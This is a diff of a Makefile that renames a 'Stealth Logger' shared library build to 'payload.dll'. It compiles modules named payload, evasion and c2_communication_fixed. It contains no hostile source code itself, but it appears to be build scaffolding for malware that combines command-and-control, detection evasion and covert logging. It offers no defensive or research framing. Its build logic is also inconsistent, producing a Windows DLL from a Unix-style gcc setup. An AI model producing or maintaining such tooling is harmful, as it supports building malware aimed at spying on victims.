@@ -1,28 +1,23 @@
-# Stealth Logger Makefile
 CC = gcc
-CFLAGS = -Wall -Wextra -O2 -fPIC -DPIC
-LDFLAGS = -shared -ldl
+CFLAGS = -Wall -Wextra -O2 -fPIC
+LDFLAGS = -shared
 
-all: libstealthlogger.so
+all: payload.dll
 
-libstealthlogger.so: main.o payload.o evasion.o c2_communication_fixed.o
+payload.dll: payload.o evasion.o c2_communication_fixed.o main.o
 	$(CC) $(LDFLAGS) -o $@ $^
-
-main.o: main.c payload.h evasion.h c2_communication_fixed.h config.h
-	$(CC) $(CFLAGS) -c -o $@ $<
 
 payload.o: payload.c payload.h payload_config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-evasion.o: evasion.c evasion.h config.h
+evasion.o: evasion.c evasion.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
 c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-clean:
-	rm -f *.o libstealthlogger.so
+main.o: main.c payload.h evasion.h c2_communication_fixed.h
+	$(CC) $(CFLAGS) -c -o $@ $<
 
-install:
-	cp libstealthlogger.so /usr/local/lib
-	ldconfig
+clean:
+	rm -f *.o payload.dll
